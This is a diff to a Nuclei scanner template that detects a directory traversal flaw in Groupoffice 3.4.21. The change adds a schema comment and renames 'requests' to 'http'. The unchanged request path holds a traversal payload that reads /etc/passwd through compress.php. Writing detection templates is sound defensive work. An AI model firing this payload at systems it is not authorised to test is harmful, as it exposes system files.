@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: groupoffice-lfi
 info:
   name: Groupoffice 3.4.21 Directory Traversal Vulnerability
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://cxsecurity.com/issue/WLB-2018020249
   tags: groupoffice,lfi
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/compress.php?file=../../../../../../../etc/passwd"
